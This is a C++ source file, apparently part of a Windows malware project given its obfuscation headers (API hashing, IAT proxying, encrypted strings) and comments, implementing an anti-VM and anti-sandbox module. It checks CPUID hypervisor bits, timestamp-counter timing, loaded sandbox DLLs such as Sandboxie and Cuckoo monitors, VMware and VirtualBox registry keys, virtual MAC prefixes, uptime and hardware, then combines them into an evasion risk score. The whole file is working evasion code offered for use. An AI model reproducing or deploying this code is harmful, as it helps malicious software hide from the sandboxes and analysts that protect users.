//id like to thank *** for the help here. fuck ur rust code tho.
//god bless exploit

#include <windows.h>
#include <wtsapi32.h>
#include <safety_utils/antivm.hpp>
#include <obfuscation/api_hash.hpp>
#include <obfuscation/iat_proxy.hpp>
#include <crypto_utils/skCrypter.hpp>
#include <intrin.h>
#include <cstdint>
#include <vector>
#include <iphlpapi.h>

namespace antivm {

    bool is_rdp() {
        DWORD sessionId = 0;
        if (!ProcessIdToSessionId(GetCurrentProcessId(), &sessionId))
            return false;

        USHORT* protocolType = nullptr;
        DWORD bytesReturned = 0;

        if (!iat::wts_query_session_info(WTS_CURRENT_SERVER_HANDLE, sessionId,
                WTSClientProtocolType, (LPWSTR*)&protocolType, &bytesReturned))
            return false;

        bool rdp = (*protocolType == WTS_PROTOCOL_TYPE_RDP);
        iat::wts_free_memory(protocolType);
        return rdp;
    }

    bool is_hypervisor_present() {
        int cpu_info[4] = { 0 };
        __cpuid(cpu_info, 1);
        //ECX bit 31 = hypervisor present
        return (cpu_info[2] & (1 << 31)) != 0;
    }

    //real hyper-v on bare metal scores differently, dont penalise legit hosts
    bool hv_is_hyperv() {
        if (is_hypervisor_present()) {
            int cpu_info[4] = { 0 };
            //leaf 0x40000000 is the hypervisor vendor ID
            __cpuid(cpu_info, 0x40000000);

            char vendor[13];
            memcpy(vendor + 0, &cpu_info[1], 4); //EBX
            memcpy(vendor + 4, &cpu_info[2], 4); //ECX
            memcpy(vendor + 8, &cpu_info[3], 4); //EDX
            vendor[12] = '\0';

            //"Microsoft Hv" = bare-metal hyper-v, everything else is a VM
            //vendor id string - https://evasions.checkpoint.com/src/Evasions/techniques/cpu.html
            return strcmp(vendor, skCrypt("Microsoft Hv")) == 0;
        }
        return false;
    }

    bool is_tsc_spoofed() {
        LARGE_INTEGER t1q, t2q, freq;
        unsigned int aux;
        const uint64_t t1 = __rdtsc();
        QueryPerformanceCounter(&t1q);
        SleepEx(50, 0);
        QueryPerformanceCounter(&t2q);
        const uint64_t t2 = __rdtscp(&aux);
        QueryPerformanceFrequency(&freq);
        const double elapsedSec = double(t2q.QuadPart - t1q.QuadPart) / double(freq.QuadPart);
        const double tscMHz = (double(t2 - t1) / elapsedSec) / 1e6;
        return tscMHz < 800.0 || tscMHz >= 7000;
    }

    bool is_vm_timing() {
        uint64_t total_cpuid_cycles = 0;
        uint64_t total_rdtsc_cycles = 0;

        for (int i = 0; i < 100; i++) {
            uint64_t tsc_start = __rdtsc();
            int cpu_info[4];
            __cpuid(cpu_info, 1);
            total_cpuid_cycles += (__rdtsc() - tsc_start);
        }

        for (int i = 0; i < 100; i++) {
            uint64_t s = __rdtsc();
            total_rdtsc_cycles += (__rdtsc() - s);
        }

        if (hv_is_hyperv())
            return (total_cpuid_cycles / 100.0 > 3500.0) || (total_rdtsc_cycles / 100.0 > 64.0);
        return (total_cpuid_cycles / 100.0 > 1000.0) || (total_rdtsc_cycles / 100.0 > 64.0);
    }

    bool has_sandbox_dlls() {
        static constexpr DWORD bad_dlls[] = {
            api_hash::hash(L"SbieDll.dll"),   //sandboxie
            api_hash::hash(L"cuckoomon.dll"), //cuckoo sandbox
            api_hash::hash(L"snxhk.dll"),     //avast sandbox hook
            api_hash::hash(L"api_log.dll"),   //CWSandbox
            api_hash::hash(L"pstorec.dll"),   //cuckoo v2 monitor
            api_hash::hash(L"vmcheck.dll"),   //vmware check hook
        };

        auto ldr  = *(api_hash::_ldr_data**)(__readgsqword(0x60) + 0x18);
        auto list = &ldr->InLoadOrderModuleList;
        for (auto e = list->Flink; e != list; e = e->Flink) {
            auto m = CONTAINING_RECORD(e, api_hash::_ldr_entry, InLoadOrderLinks);
            if (!m->BaseDllName.Buffer) continue;
            DWORD h = api_hash::hash(m->BaseDllName.Buffer);
            for (DWORD bad : bad_dlls)
                if (h == bad) return true;
        }
        return false;
    }

    bool has_vm_registry() {
        auto check = [](const char* key) -> bool {
            HKEY h;
            bool r = RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &h) == ERROR_SUCCESS;
            if (r) RegCloseKey(h);
            return r;
        };
        return check(skCrypt("SOFTWARE\\VMware, Inc.\\VMware Tools"))
            || check(skCrypt("SOFTWARE\\Oracle\\VirtualBox Guest Additions"))
            || check(skCrypt("SYSTEM\\ControlSet001\\Services\\vmhgfs"))
            || check(skCrypt("SYSTEM\\ControlSet001\\Services\\VBOXGUEST"))
            || check(skCrypt("SYSTEM\\ControlSet001\\Services\\vmci"));
    }

    bool has_vm_mac() {
        typedef DWORD (WINAPI* pfn_GetAdaptersInfo)(PIP_ADAPTER_INFO, PULONG);
        HMODULE iphlp = LoadLibraryA(skCrypt("iphlpapi.dll"));
        if (!iphlp) return false;

        auto fn = (pfn_GetAdaptersInfo)GetProcAddress(iphlp, skCrypt("GetAdaptersInfo"));
        if (!fn) { FreeLibrary(iphlp); return false; }

        ULONG buflen = sizeof(IP_ADAPTER_INFO) * 4;
        std::vector<BYTE> buf(buflen);
        DWORD rc;
        while ((rc = fn((PIP_ADAPTER_INFO)buf.data(), &buflen)) == ERROR_BUFFER_OVERFLOW)
            buf.resize(buflen);

        FreeLibrary(iphlp);
        if (rc != ERROR_SUCCESS) return false;

        //VMware (00:0C:29, 00:50:56), VirtualBox (08:00:27), Hyper-V (00:15:5D), QEMU (52:54:00), Parallels (00:21:F6), shoutout some github repo
        static const uint8_t vm_ouis[][3] = {
            {0x00,0x0C,0x29},{0x00,0x50,0x56},
            {0x08,0x00,0x27},{0x00,0x15,0x5D},
            {0x52,0x54,0x00},{0x00,0x21,0xF6}
        };

        for (auto* ai = (PIP_ADAPTER_INFO)buf.data(); ai; ai = ai->Next)
            for (const auto& oui : vm_ouis)
                if (memcmp(ai->Address, oui, 3) == 0) return true;

        return false;
    }

    //https://www.youtube.com/watch?v=SMPM6JBS6Ck
    //sandboxes run less than 30 mins
    bool is_low_uptime() {
        return GetTickCount64() < 30ULL * 60 * 1000;
    }

    //adjust as needed
    bool is_low_resources() {
        SYSTEM_INFO si{};
        GetSystemInfo(&si);
        if (si.dwNumberOfProcessors < 4) return true;

        MEMORYSTATUSEX ms{ .dwLength = sizeof(ms) };
        GlobalMemoryStatusEx(&ms);
        if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;

        return false;
    }

    int calc_risk() {
        int score = 0;

        if (is_hypervisor_present()) score += 45;
        if (is_tsc_spoofed())        score += 15;
        if (is_vm_timing())          score += 35;
        if (has_sandbox_dlls())      score += 40;
        if (has_vm_registry())       score += 30;
        if (has_vm_mac())            score += 25;
        if (is_low_resources())      score += 20;
        if (is_rdp())                score += 5;
        if (is_low_uptime())         score += 45;

        //hyper-v on a real host, partial credit back
        if (hv_is_hyperv())
            score -= 30;

        if (score < 0)   score = 0;
        if (score > 100) score = 100;
        return score;
    }

}
